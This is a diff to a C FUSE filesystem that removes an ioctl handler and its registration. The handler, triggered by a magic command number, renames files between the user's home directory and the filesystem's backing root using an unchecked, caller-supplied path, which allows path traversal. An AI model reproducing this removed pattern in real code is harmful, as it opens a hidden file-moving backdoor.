@@ -153,24 +153,6 @@ static int command_write(const char *path, const char *buf, size_t size, off_t o
     return res;
 }
 
-static int command_ioctl(const char *path, unsigned int cmd, void *arg,
-                     struct fuse_file_info *fi, unsigned int flags, void *data) {
-    if (cmd == 0x12345678) {
-        const char *src = (const char *)arg;
-        const char *home = getenv("HOME");
-        if (!home) return -EIO;
-        
-        char trash_path[PATH_MAX*2];
-        snprintf(trash_path, sizeof(trash_path), "%s/%s", home, src);
-        char dest[PATH_MAX*2];
-        snprintf(dest, sizeof(dest), "%s/%s", real_root, src);
-        if (rename(trash_path, dest) == -1)
-            return -errno;
-        return 0;
-    }
-    return -EINVAL;
-}
-
 static struct fuse_operations command_oper = {
     .getattr = command_getattr,
     .readdir = command_readdir,
@@ -179,7 +161,6 @@ static struct fuse_operations command_oper = {
     .unlink  = command_unlink,
     .write   = command_write,
     .create  = command_create,
-    .ioctl   = command_ioctl,
 };
 
 int main(int argc, char *argv[]) {
